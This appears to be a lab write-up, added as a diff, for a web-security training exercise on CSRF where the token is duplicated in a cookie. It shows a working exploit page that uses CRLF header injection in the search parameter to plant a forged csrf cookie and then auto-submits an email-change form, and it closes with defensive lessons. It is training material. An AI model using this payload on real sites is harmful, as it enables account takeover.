@@ -1,0 +1,75 @@
+================================
+LAB: CSRF where token is duplicated in cookie
+================================
+
+[LAB INFORMATION]
+-----------------
+Date: February 04, 2026
+Lab URL: https://0a8c00410477a27b80fc265200d9009f.web-security-academy.net
+Category: Cross-Site Request Forgery (CSRF)
+Level: Practitioner
+Objective: Use exploit server to host HTML page that performs CSRF attack to change victim's email address
+Description: Email change functionality uses insecure "double submit" CSRF prevention. Application compares CSRF token in cookie with token in request body but does not validate token authenticity or session binding.
+
+[RECONNAISSANCE]
+----------------
+Analyzed email change request:
+POST /my-account/change-email
+Cookie: csrf=qVFUjijS2PzumptvwGkbsRO9RgXH4IR0; session=...
+Body: email=test@test.ca&csrf=qVFUjijS2PzumptvwGkbsRO9RgXH4IR0
+
+Server validates: cookie[csrf] == body[csrf]
+No validation of token authenticity or session binding.
+
+Tested search functionality:
+GET /?search=test
+Response: Set-Cookie: LastSearchTerm=test
+
+Search parameter reflects directly into Set-Cookie header - vulnerable to CRLF injection.
+
+Confirmed CRLF injection:
+GET /?search=test%0d%0aSet-Cookie:%20csrf=arbitrary123
+Response headers:
+  Set-Cookie: LastSearchTerm=test
+  Set-Cookie: csrf=arbitrary123
+
+[VULNERABILITY DISCOVERY]
+-------------------------
+Double submit cookie pattern without server-side token validation. Application accepts any CSRF token value as long as cookie matches body parameter. CRLF injection in search parameter allows arbitrary cookie injection. Missing SameSite attribute enforcement enables cross-site cookie transmission.
+
+[EXPLOITATION]
+--------------
+Payload hosted on exploit server:
+
+<html>
+    <body>
+        <form action="https://0a8c00410477a27b80fc265200d9009f.web-security-academy.net/my-account/change-email" method="post">
+            <input type="hidden" name="email" value="test5@test.ca">
+            <input type="hidden" name="csrf" value="hacked">
+        </form>
+        <img src="https://0a8c00410477a27b80fc265200d9009f.web-security-academy.net/?search=hat%0d%0aSet-Cookie:%20csrf=hacked%3b%20SameSite=None" onerror="document.forms[0].submit()">
+    </body>
+</html>
+
+Attack flow:
+1. Victim loads exploit page
+2. <img> triggers GET request with CRLF injection
+3. Server sets: csrf=hacked; SameSite=None
+4. Form auto-submits with csrf=hacked in body
+5. Server validates: cookie[csrf] == body[csrf] → both "hacked" → valid
+6. Email changed
+
+Critical: SameSite=None required to transmit cookie in cross-site POST request from exploit domain.
+
+[EVIDENCE]
+----------
+Lab marked as solved after delivering exploit to victim.
+Victim's email successfully changed to attacker-controlled address.
+
+[LESSONS LEARNED]
+-----------------
+- Double submit cookie is insecure without server-side secret/HMAC validation of token authenticity
+- CRLF injection enables arbitrary cookie manipulation via header injection
+- SameSite cookie attribute is critical CSRF defense - must be Strict or Lax on sensitive cookies
+- CSRF tokens must be cryptographically tied to user session on server-side, not just compared client-side
+- Input validation on all parameters that influence HTTP headers to prevent CRLF injection
